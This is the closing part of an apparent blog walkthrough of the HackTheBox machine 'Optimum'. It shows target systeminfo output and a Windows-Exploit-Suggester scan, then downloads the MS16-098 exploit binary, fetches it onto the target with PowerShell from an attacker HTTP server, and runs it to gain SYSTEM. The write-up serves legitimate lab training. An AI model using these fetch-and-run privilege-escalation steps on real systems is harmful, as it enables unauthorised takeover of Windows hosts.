</span></span><span class=line><span class=cl>Total Physical Memory:     4.095 MB
</span></span><span class=line><span class=cl>Available Physical Memory: 3.481 MB
</span></span><span class=line><span class=cl>Virtual Memory: Max Size:  5.503 MB
</span></span><span class=line><span class=cl>Virtual Memory: Available: 4.930 MB
</span></span><span class=line><span class=cl>Virtual Memory: In Use:    <span class=m>573</span> MB
</span></span><span class=line><span class=cl>Page File Location<span class=o>(</span>s<span class=o>)</span>:     C:<span class=se>\p</span>agefile.sys
</span></span><span class=line><span class=cl>Domain:                    HTB
</span></span><span class=line><span class=cl>Logon Server:              <span class=se>\\</span>OPTIMUM
</span></span><span class=line><span class=cl>Hotfix<span class=o>(</span>s<span class=o>)</span>:                 <span class=m>31</span> Hotfix<span class=o>(</span>s<span class=o>)</span> Installed.
</span></span><span class=line><span class=cl>                           <span class=o>[</span>01<span class=o>]</span>: KB2959936
</span></span><span class=line><span class=cl>                           <span class=o>[</span>02<span class=o>]</span>: KB2896496
</span></span><span class=line><span class=cl>                           <span class=o>[</span>03<span class=o>]</span>: KB2919355
</span></span><span class=line><span class=cl>                           <span class=o>[</span>04<span class=o>]</span>: KB2920189
</span></span><span class=line><span class=cl>                           <span class=o>[</span>05<span class=o>]</span>: KB2928120
</span></span><span class=line><span class=cl>                           <span class=o>[</span>06<span class=o>]</span>: KB2931358
</span></span><span class=line><span class=cl>                           <span class=o>[</span>07<span class=o>]</span>: KB2931366
</span></span><span class=line><span class=cl>                           <span class=o>[</span>08<span class=o>]</span>: KB2933826
</span></span><span class=line><span class=cl>                           <span class=o>[</span>09<span class=o>]</span>: KB2938772
</span></span><span class=line><span class=cl>                           <span class=o>[</span>10<span class=o>]</span>: KB2949621
</span></span><span class=line><span class=cl>                           <span class=o>[</span>11<span class=o>]</span>: KB2954879
</span></span><span class=line><span class=cl>                           <span class=o>[</span>12<span class=o>]</span>: KB2958262
</span></span><span class=line><span class=cl>                           <span class=o>[</span>13<span class=o>]</span>: KB2958263
</span></span><span class=line><span class=cl>                           <span class=o>[</span>14<span class=o>]</span>: KB2961072
</span></span><span class=line><span class=cl>                           <span class=o>[</span>15<span class=o>]</span>: KB2965500
</span></span><span class=line><span class=cl>                           <span class=o>[</span>16<span class=o>]</span>: KB2966407
</span></span><span class=line><span class=cl>                           <span class=o>[</span>17<span class=o>]</span>: KB2967917
</span></span><span class=line><span class=cl>                           <span class=o>[</span>18<span class=o>]</span>: KB2971203
</span></span><span class=line><span class=cl>                           <span class=o>[</span>19<span class=o>]</span>: KB2971850
</span></span><span class=line><span class=cl>                           <span class=o>[</span>20<span class=o>]</span>: KB2973351
</span></span><span class=line><span class=cl>                           <span class=o>[</span>21<span class=o>]</span>: KB2973448
</span></span><span class=line><span class=cl>                           <span class=o>[</span>22<span class=o>]</span>: KB2975061
</span></span><span class=line><span class=cl>                           <span class=o>[</span>23<span class=o>]</span>: KB2976627
</span></span><span class=line><span class=cl>                           <span class=o>[</span>24<span class=o>]</span>: KB2977629
</span></span><span class=line><span class=cl>                           <span class=o>[</span>25<span class=o>]</span>: KB2981580
</span></span><span class=line><span class=cl>                           <span class=o>[</span>26<span class=o>]</span>: KB2987107
</span></span><span class=line><span class=cl>                           <span class=o>[</span>27<span class=o>]</span>: KB2989647
</span></span><span class=line><span class=cl>                           <span class=o>[</span>28<span class=o>]</span>: KB2998527
</span></span><span class=line><span class=cl>                           <span class=o>[</span>29<span class=o>]</span>: KB3000850
</span></span><span class=line><span class=cl>                           <span class=o>[</span>30<span class=o>]</span>: KB3003057
</span></span><span class=line><span class=cl>                           <span class=o>[</span>31<span class=o>]</span>: KB3014442
</span></span><span class=line><span class=cl>Network Card<span class=o>(</span>s<span class=o>)</span>:           <span class=m>1</span> NIC<span class=o>(</span>s<span class=o>)</span> Installed.
</span></span><span class=line><span class=cl>                           <span class=o>[</span>01<span class=o>]</span>: Intel<span class=o>(</span>R<span class=o>)</span> 82574L Gigabit Network Connection
</span></span><span class=line><span class=cl>                                 Connection Name: Ethernet0
</span></span><span class=line><span class=cl>                                 DHCP Enabled:    No
</span></span><span class=line><span class=cl>                                 IP address<span class=o>(</span>es<span class=o>)</span>
</span></span><span class=line><span class=cl>                                 <span class=o>[</span>01<span class=o>]</span>: 10.10.10.8
</span></span><span class=line><span class=cl>Hyper-V Requirements:      A hypervisor has been detected. Features required <span class=k>for</span> Hyper-V will not be displayed.
</span></span></code></pre></div><p>I used this tool to check for vulnerabilities from systeminfo.
<a href=https://github.com/AonCyberLabs/Windows-Exploit-Suggester>https://github.com/AonCyberLabs/Windows-Exploit-Suggester</a></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl><span class=c1># git clone https://github.com/AonCyberLabs/Windows-Exploit-Suggester</span>
</span></span><span class=line><span class=cl><span class=c1># cd Windows-Exploit-Suggester</span>
</span></span><span class=line><span class=cl><span class=c1># ./windows-exploit-suggester.py --update</span>
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> initiating...
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> successfully requested base url
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> scraped ms download url
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> writing to file 2019-11-03-mssb.xls
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> <span class=k>done</span>
</span></span></code></pre></div><p>And create systeminfo as text file(File Name: <code>systeminfo.txt</code>)
Next, check vuln with <code>windows-exploit-suggester.py</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl><span class=c1># ./windows-exploit-suggester.py -d ./2019-11-03-mssb.xls --systeminfo ./systeminfo.txt </span>
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> initiating winsploit version 3.3...
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> database file detected as xls or xlsx based on extension
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> attempting to <span class=nb>read</span> from the systeminfo input file
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> systeminfo input file <span class=nb>read</span> successfully <span class=o>(</span>utf-8<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> querying database file <span class=k>for</span> potential vulnerabilities
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> comparing the <span class=m>32</span> hotfix<span class=o>(</span>es<span class=o>)</span> against the <span class=m>266</span> potential bulletins<span class=o>(</span>s<span class=o>)</span> with a database of <span class=m>137</span> known exploits
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> there are now <span class=m>246</span> remaining vulns
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> <span class=o>[</span>E<span class=o>]</span> exploitdb PoC, <span class=o>[</span>M<span class=o>]</span> Metasploit module, <span class=o>[</span>*<span class=o>]</span> missing bulletin
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> windows version identified as <span class=s1>&#39;Windows 2012 R2 64-bit&#39;</span>
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> 
</span></span><span class=line><span class=cl><span class=o>[</span>E<span class=o>]</span> MS16-135: Security Update <span class=k>for</span> Windows Kernel-Mode Drivers <span class=o>(</span>3199135<span class=o>)</span> - Important
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span>   https://www.exploit-db.com/exploits/40745/ -- Microsoft Windows Kernel - win32k Denial of Service <span class=o>(</span>MS16-135<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span>   https://www.exploit-db.com/exploits/41015/ -- Microsoft Windows Kernel - <span class=s1>&#39;win32k.sys&#39;</span> <span class=s1>&#39;NtSetWindowLongPtr&#39;</span> Privilege Escalation <span class=o>(</span>MS16-135<span class=o>)</span> <span class=o>(</span>2<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span>   https://github.com/tinysec/public/tree/master/CVE-2016-7255
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> 
</span></span><span class=line><span class=cl><span class=o>[</span>E<span class=o>]</span> MS16-098: Security Update <span class=k>for</span> Windows Kernel-Mode Drivers <span class=o>(</span>3178466<span class=o>)</span> - Important
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span>   https://www.exploit-db.com/exploits/41020/ -- Microsoft Windows 8.1 <span class=o>(</span>x64<span class=o>)</span> - RGNOBJ Integer Overflow <span class=o>(</span>MS16-098<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> 
</span></span><span class=line><span class=cl><span class=o>[</span>M<span class=o>]</span> MS16-075: Security Update <span class=k>for</span> Windows SMB Server <span class=o>(</span>3164038<span class=o>)</span> - Important
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span>   https://github.com/foxglovesec/RottenPotato
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span>   https://github.com/Kevin-Robertson/Tater
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span>   https://bugs.chromium.org/p/project-zero/issues/detail?id<span class=o>=</span><span class=m>222</span> -- Windows: Local WebDAV NTLM Reflection Elevation of Privilege
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span>   https://foxglovesecurity.com/2016/01/16/hot-potato/ -- Hot Potato - Windows Privilege Escalation
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> 
</span></span><span class=line><span class=cl><span class=o>[</span>E<span class=o>]</span> MS16-074: Security Update <span class=k>for</span> Microsoft Graphics Component <span class=o>(</span>3164036<span class=o>)</span> - Important
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span>   https://www.exploit-db.com/exploits/39990/ -- Windows - gdi32.dll Multiple DIB-Related EMF Record Handlers Heap-Based Out-of-Bounds Reads/Memory Disclosure <span class=o>(</span>MS16-074<span class=o>)</span>, PoC
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span>   https://www.exploit-db.com/exploits/39991/ -- Windows Kernel - ATMFD.DLL NamedEscape 0x250C Pool Corruption <span class=o>(</span>MS16-074<span class=o>)</span>, PoC
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> 
</span></span><span class=line><span class=cl><span class=o>[</span>E<span class=o>]</span> MS16-063: Cumulative Security Update <span class=k>for</span> Internet Explorer <span class=o>(</span>3163649<span class=o>)</span> - Critical
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span>   https://www.exploit-db.com/exploits/39994/ -- Internet Explorer <span class=m>11</span> - Garbage Collector Attribute Type Confusion <span class=o>(</span>MS16-063<span class=o>)</span>, PoC
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> 
</span></span><span class=line><span class=cl><span class=o>[</span>E<span class=o>]</span> MS16-032: Security Update <span class=k>for</span> Secondary Logon to Address Elevation of Privile <span class=o>(</span>3143141<span class=o>)</span> - Important
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span>   https://www.exploit-db.com/exploits/40107/ -- MS16-032 Secondary Logon Handle Privilege Escalation, MSF
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span>   https://www.exploit-db.com/exploits/39574/ -- Microsoft Windows 8.1/10 - Secondary Logon Standard Handles Missing Sanitization Privilege Escalation <span class=o>(</span>MS16-032<span class=o>)</span>, PoC
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span>   https://www.exploit-db.com/exploits/39719/ -- Microsoft Windows 7-10 <span class=p>&amp;</span> Server 2008-2012 <span class=o>(</span>x32/x64<span class=o>)</span> - Local Privilege Escalation <span class=o>(</span>MS16-032<span class=o>)</span> <span class=o>(</span>PowerShell<span class=o>)</span>, PoC
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span>   https://www.exploit-db.com/exploits/39809/ -- Microsoft Windows 7-10 <span class=p>&amp;</span> Server 2008-2012 <span class=o>(</span>x32/x64<span class=o>)</span> - Local Privilege Escalation <span class=o>(</span>MS16-032<span class=o>)</span> <span class=o>(</span>C#<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> 
</span></span><span class=line><span class=cl><span class=o>[</span>M<span class=o>]</span> MS16-016: Security Update <span class=k>for</span> WebDAV to Address Elevation of Privilege <span class=o>(</span>3136041<span class=o>)</span> - Important
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span>   https://www.exploit-db.com/exploits/40085/ -- MS16-016 mrxdav.sys WebDav Local Privilege Escalation, MSF
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span>   https://www.exploit-db.com/exploits/39788/ -- Microsoft Windows <span class=m>7</span> - WebDAV Privilege Escalation Exploit <span class=o>(</span>MS16-016<span class=o>)</span> <span class=o>(</span>2<span class=o>)</span>, PoC
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span>   https://www.exploit-db.com/exploits/39432/ -- Microsoft Windows <span class=m>7</span> SP1 x86 - WebDAV Privilege Escalation <span class=o>(</span>MS16-016<span class=o>)</span> <span class=o>(</span>1<span class=o>)</span>, PoC
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> 
</span></span><span class=line><span class=cl><span class=o>[</span>E<span class=o>]</span> MS16-014: Security Update <span class=k>for</span> Microsoft Windows to Address Remote Code Execution <span class=o>(</span>3134228<span class=o>)</span> - Important
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span>   Windows <span class=m>7</span> SP1 x86 - Privilege Escalation <span class=o>(</span>MS16-014<span class=o>)</span>, https://www.exploit-db.com/exploits/40039/, PoC
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> 
</span></span><span class=line><span class=cl><span class=o>[</span>E<span class=o>]</span> MS16-007: Security Update <span class=k>for</span> Microsoft Windows to Address Remote Code Execution <span class=o>(</span>3124901<span class=o>)</span> - Important
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span>   https://www.exploit-db.com/exploits/39232/ -- Microsoft Windows devenum.dll!DeviceMoniker::Load<span class=o>()</span> - Heap Corruption Buffer Underflow <span class=o>(</span>MS16-007<span class=o>)</span>, PoC
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span>   https://www.exploit-db.com/exploits/39233/ -- Microsoft Office / COM Object DLL Planting with WMALFXGFXDSP.dll <span class=o>(</span>MS-16-007<span class=o>)</span>, PoC
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> 
</span></span><span class=line><span class=cl><span class=o>[</span>E<span class=o>]</span> MS15-132: Security Update <span class=k>for</span> Microsoft Windows to Address Remote Code Execution <span class=o>(</span>3116162<span class=o>)</span> - Important
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span>   https://www.exploit-db.com/exploits/38968/ -- Microsoft Office / COM Object DLL Planting with comsvcs.dll Delay Load of mqrt.dll <span class=o>(</span>MS15-132<span class=o>)</span>, PoC
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span>   https://www.exploit-db.com/exploits/38918/ -- Microsoft Office / COM Object els.dll DLL Planting <span class=o>(</span>MS15-134<span class=o>)</span>, PoC
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> 
</span></span><span class=line><span class=cl><span class=o>[</span>E<span class=o>]</span> MS15-112: Cumulative Security Update <span class=k>for</span> Internet Explorer <span class=o>(</span>3104517<span class=o>)</span> - Critical
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span>   https://www.exploit-db.com/exploits/39698/ -- Internet Explorer 9/10/11 - CDOMStringDataList::InitFromString Out-of-Bounds Read <span class=o>(</span>MS15-112<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> 
</span></span><span class=line><span class=cl><span class=o>[</span>E<span class=o>]</span> MS15-111: Security Update <span class=k>for</span> Windows Kernel to Address Elevation of Privilege <span class=o>(</span>3096447<span class=o>)</span> - Important
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span>   https://www.exploit-db.com/exploits/38474/ -- Windows <span class=m>10</span> Sandboxed Mount Reparse Point Creation Mitigation Bypass <span class=o>(</span>MS15-111<span class=o>)</span>, PoC
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> 
</span></span><span class=line><span class=cl><span class=o>[</span>E<span class=o>]</span> MS15-102: Vulnerabilities in Windows Task Management Could Allow Elevation of Privilege <span class=o>(</span>3089657<span class=o>)</span> - Important
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span>   https://www.exploit-db.com/exploits/38202/ -- Windows CreateObjectTask SettingsSyncDiagnostics Privilege Escalation, PoC
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span>   https://www.exploit-db.com/exploits/38200/ -- Windows Task Scheduler DeleteExpiredTaskAfter File Deletion Privilege Escalation, PoC
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span>   https://www.exploit-db.com/exploits/38201/ -- Windows CreateObjectTask TileUserBroker Privilege Escalation, PoC
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> 
</span></span><span class=line><span class=cl><span class=o>[</span>E<span class=o>]</span> MS15-097: Vulnerabilities in Microsoft Graphics Component Could Allow Remote Code Execution <span class=o>(</span>3089656<span class=o>)</span> - Critical
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span>   https://www.exploit-db.com/exploits/38198/ -- Windows <span class=m>10</span> Build <span class=m>10130</span> - User Mode Font Driver Thread Permissions Privilege Escalation, PoC
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span>   https://www.exploit-db.com/exploits/38199/ -- Windows NtUserGetClipboardAccessToken Token Leak, PoC
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> 
</span></span><span class=line><span class=cl><span class=o>[</span>M<span class=o>]</span> MS15-078: Vulnerability in Microsoft Font Driver Could Allow Remote Code Execution <span class=o>(</span>3079904<span class=o>)</span> - Critical
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span>   https://www.exploit-db.com/exploits/38222/ -- MS15-078 Microsoft Windows Font Driver Buffer Overflow
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> 
</span></span><span class=line><span class=cl><span class=o>[</span>E<span class=o>]</span> MS15-052: Vulnerability in Windows Kernel Could Allow Security Feature Bypass <span class=o>(</span>3050514<span class=o>)</span> - Important
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span>   https://www.exploit-db.com/exploits/37052/ -- Windows - CNG.SYS Kernel Security Feature Bypass PoC <span class=o>(</span>MS15-052<span class=o>)</span>, PoC
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> 
</span></span><span class=line><span class=cl><span class=o>[</span>M<span class=o>]</span> MS15-051: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege <span class=o>(</span>3057191<span class=o>)</span> - Important
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span>   https://github.com/hfiref0x/CVE-2015-1701, Win32k Elevation of Privilege Vulnerability, PoC
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span>   https://www.exploit-db.com/exploits/37367/ -- Windows ClientCopyImage Win32k Exploit, MSF
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> 
</span></span><span class=line><span class=cl><span class=o>[</span>E<span class=o>]</span> MS15-010: Vulnerabilities in Windows Kernel-Mode Driver Could Allow Remote Code Execution <span class=o>(</span>3036220<span class=o>)</span> - Critical
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span>   https://www.exploit-db.com/exploits/39035/ -- Microsoft Windows 8.1 - win32k Local Privilege Escalation <span class=o>(</span>MS15-010<span class=o>)</span>, PoC
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span>   https://www.exploit-db.com/exploits/37098/ -- Microsoft Windows - Local Privilege Escalation <span class=o>(</span>MS15-010<span class=o>)</span>, PoC
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span>   https://www.exploit-db.com/exploits/39035/ -- Microsoft Windows win32k Local Privilege Escalation <span class=o>(</span>MS15-010<span class=o>)</span>, PoC
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> 
</span></span><span class=line><span class=cl><span class=o>[</span>E<span class=o>]</span> MS15-001: Vulnerability in Windows Application Compatibility Cache Could Allow Elevation of Privilege <span class=o>(</span>3023266<span class=o>)</span> - Important
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span>   http://www.exploit-db.com/exploits/35661/ -- Windows 8.1 <span class=o>(</span>32/64 bit<span class=o>)</span> - Privilege Escalation <span class=o>(</span>ahcache.sys/NtApphelpCacheControl<span class=o>)</span>, PoC
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> 
</span></span><span class=line><span class=cl><span class=o>[</span>E<span class=o>]</span> MS14-068: Vulnerability in Kerberos Could Allow Elevation of Privilege <span class=o>(</span>3011780<span class=o>)</span> - Critical
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span>   http://www.exploit-db.com/exploits/35474/ -- Windows Kerberos - Elevation of Privilege <span class=o>(</span>MS14-068<span class=o>)</span>, PoC
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> 
</span></span><span class=line><span class=cl><span class=o>[</span>M<span class=o>]</span> MS14-064: Vulnerabilities in Windows OLE Could Allow Remote Code Execution <span class=o>(</span>3011443<span class=o>)</span> - Critical
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span>   https://www.exploit-db.com/exploits/37800// -- Microsoft Windows HTA <span class=o>(</span>HTML Application<span class=o>)</span> - Remote Code Execution <span class=o>(</span>MS14-064<span class=o>)</span>, PoC
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span>   http://www.exploit-db.com/exploits/35308/ -- Internet Explorer OLE Pre-IE11 - Automation Array Remote Code Execution / Powershell VirtualAlloc <span class=o>(</span>MS14-064<span class=o>)</span>, PoC
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span>   http://www.exploit-db.com/exploits/35229/ -- Internet Explorer &lt;<span class=o>=</span> <span class=m>11</span> - OLE Automation Array Remote Code Execution <span class=o>(</span><span class=c1>#1), PoC</span>
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span>   http://www.exploit-db.com/exploits/35230/ -- Internet Explorer &lt; <span class=m>11</span> - OLE Automation Array Remote Code Execution <span class=o>(</span>MSF<span class=o>)</span>, MSF
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span>   http://www.exploit-db.com/exploits/35235/ -- MS14-064 Microsoft Windows OLE Package Manager Code Execution Through Python, MSF
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span>   http://www.exploit-db.com/exploits/35236/ -- MS14-064 Microsoft Windows OLE Package Manager Code Execution, MSF
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> 
</span></span><span class=line><span class=cl><span class=o>[</span>M<span class=o>]</span> MS14-060: Vulnerability in Windows OLE Could Allow Remote Code Execution <span class=o>(</span>3000869<span class=o>)</span> - Important
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span>   http://www.exploit-db.com/exploits/35055/ -- Windows OLE - Remote Code Execution <span class=s1>&#39;Sandworm&#39;</span> Exploit <span class=o>(</span>MS14-060<span class=o>)</span>, PoC
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span>   http://www.exploit-db.com/exploits/35020/ -- MS14-060 Microsoft Windows OLE Package Manager Code Execution, MSF
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> 
</span></span><span class=line><span class=cl><span class=o>[</span>M<span class=o>]</span> MS14-058: Vulnerabilities in Kernel-Mode Driver Could Allow Remote Code Execution <span class=o>(</span>3000061<span class=o>)</span> - Critical
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span>   http://www.exploit-db.com/exploits/35101/ -- Windows TrackPopupMenu Win32k NULL Pointer Dereference, MSF
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> 
</span></span><span class=line><span class=cl><span class=o>[</span>E<span class=o>]</span> MS13-101: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege <span class=o>(</span>2880430<span class=o>)</span> - Important
</span></span><span class=line><span class=cl><span class=o>[</span>M<span class=o>]</span> MS13-090: Cumulative Security Update of ActiveX Kill Bits <span class=o>(</span>2900986<span class=o>)</span> - Critical
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> <span class=k>done</span>
</span></span></code></pre></div><p>In this suggestions, I found a vulnerability named MS16-098.
This vulnerability can use Privilege Escalation.
<a href=https://www.exploit-db.com/exploits/41020>Details in exploit-db</a>
Since binary is provided, download with <code>wget</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl><span class=c1># wget https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/41020.exe</span>
</span></span></code></pre></div><p>And provide it to target machine via HTTP.
In target machine, download and execute it.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>c:<span class=se>\U</span>sers<span class=se>\k</span>ostas<span class=se>\D</span>esktop&gt;powershell wget http://10.10.14.9/41020.exe -outfile 41020.exe
</span></span><span class=line><span class=cl>powershell wget http://10.10.14.9/41020.exe -outfile 41020.exe
</span></span><span class=line><span class=cl>c:<span class=se>\U</span>sers<span class=se>\k</span>ostas<span class=se>\D</span>esktop&gt;41020.exe
</span></span><span class=line><span class=cl>41020.exe
</span></span><span class=line><span class=cl>Microsoft Windows <span class=o>[</span>Version 6.3.9600<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=o>(</span>c<span class=o>)</span> <span class=m>2013</span> Microsoft Corporation. All rights reserved.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>c:<span class=se>\U</span>sers<span class=se>\k</span>ostas<span class=se>\D</span>esktop&gt;
</span></span></code></pre></div><p>Check privilege.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>c:<span class=se>\U</span>sers<span class=se>\k</span>ostas<span class=se>\D</span>esktop&gt;whoami
</span></span><span class=line><span class=cl>whoami
</span></span><span class=line><span class=cl>nt authority<span class=se>\s</span>ystem
</span></span></code></pre></div><p>I got system privilege.
Check root flag.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>c:<span class=se>\U</span>sers<span class=se>\k</span>ostas<span class=se>\D</span>esktop&gt; <span class=nb>cd</span> c:<span class=se>\U</span>sers<span class=se>\A</span>dministrator<span class=se>\D</span>esktop
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>c:<span class=se>\U</span>sers<span class=se>\A</span>dministrator<span class=se>\D</span>esktop&gt;dir
</span></span><span class=line><span class=cl>dir
</span></span><span class=line><span class=cl> Volume in drive C has no label.
</span></span><span class=line><span class=cl> Volume Serial Number is D0BC-0196
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl> Directory of c:<span class=se>\U</span>sers<span class=se>\A</span>dministrator<span class=se>\D</span>esktop
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>18/03/2017  02:14 ��    &lt;DIR&gt;          .
</span></span><span class=line><span class=cl>18/03/2017  02:14 ��    &lt;DIR&gt;          ..
</span></span><span class=line><span class=cl>18/03/2017  02:14 ��                <span class=m>32</span> root.txt
</span></span><span class=line><span class=cl>               <span class=m>1</span> File<span class=o>(</span>s<span class=o>)</span>             <span class=m>32</span> bytes
</span></span><span class=line><span class=cl>               <span class=m>2</span> Dir<span class=o>(</span>s<span class=o>)</span>  31.889.264.640 bytes free
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>c:<span class=se>\U</span>sers<span class=se>\A</span>dministrator<span class=se>\D</span>esktop&gt;type root.txt
</span></span></code></pre></div></div><footer class=post-footer><ul class=post-tags></ul><nav class=paginav><a class=prev href=http://localhost:1313/posts/githubactions/><span class=title>« Prev</span><br><span>GitHub Actionでマルチプラットフォームなテストをした</span>
</a><a class=next href=http://localhost:1313/posts/nse/><span class=title>Next »</span><br><span>About NSE scripts</span></a></nav><ul class=share-buttons><li><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox Walkthrough - Optim on x" href="https://x.com/intent/tweet/?text=HackTheBox%20Walkthrough%20-%20Optim&amp;url=http%3a%2f%2flocalhost%3a1313%2fposts%2foptim%2f&amp;hashtags="><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M512 62.554V449.446C512 483.97 483.97 512 449.446 512H62.554C28.03 512 0 483.97.0 449.446V62.554C0 28.03 28.029.0 62.554.0H449.446C483.971.0 512 28.03 512 62.554zM269.951 190.75 182.567 75.216H56L207.216 272.95 63.9 436.783h61.366L235.9 310.383l96.667 126.4H456L298.367 228.367l134-153.151H371.033zM127.633 110h36.468l219.38 290.065H349.5z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox Walkthrough - Optim on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=http%3a%2f%2flocalhost%3a1313%2fposts%2foptim%2f&amp;title=HackTheBox%20Walkthrough%20-%20Optim&amp;summary=HackTheBox%20Walkthrough%20-%20Optim&amp;source=http%3a%2f%2flocalhost%3a1313%2fposts%2foptim%2f"><svg viewBox="0 